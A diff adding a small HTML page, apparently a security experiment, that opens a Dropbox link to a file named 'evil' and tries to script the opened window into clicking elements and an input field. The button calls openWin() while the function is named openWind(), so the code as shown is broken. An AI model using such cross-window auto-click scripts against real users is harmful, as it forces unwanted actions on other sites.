@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<div id="accessing_iframe">
+<h2>Accessing Iframe</h2>
+<button id="bad-dropbox" onclick="openWin()">Set Dropbox</button>
+</div>
+<br>
+<br>
+
+<script>
+
+function openWind() {
+    var mywin = window.open("https://www.dropbox.com/s/nukwjpgslq8wegu/evil?dl=0", "hihi");
+    mywin.onload = function (){
+        var x = mywin.document.getElementById("default_content_a2md");
+        x.click();
+        setTimeout(function(){
+        var y = mywin.document.getElementsByTagName("input");
+        y[0].click();
+        }, 5000);
+    }
+
+}
+</script>
